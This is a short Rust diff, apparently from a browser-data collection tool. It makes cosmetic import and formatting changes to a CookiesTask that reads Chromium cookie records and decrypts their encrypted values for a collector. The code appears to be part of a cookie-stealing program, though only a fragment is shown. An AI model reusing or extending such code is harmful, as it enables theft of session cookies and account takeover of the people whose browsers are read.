@@ -1,10 +1,11 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{BrowserData, decrypt_data};
-use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, ExtractExt};
+use crate::{
+    Cookie, ExtractExt, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all,
+};
 use alloc::sync::Arc;
-use derive_new::new;
 use collector::{Browser, Collector};
-use database::{TableRecord, Value};
+use derive_new::new;
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
@@ -37,7 +38,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
                 COOKIES_PATH,
                 COOKIES_EXPIRES_UTC,
                 COOKIES_ENCRYPTED_VALUE,
-                |value| decrypt_data(&value.as_blob()?, &self.browser).map(Into::into)
+                |value| decrypt_data(&value.as_blob()?, &self.browser).map(Into::into),
             )),
         ) else {
             return;
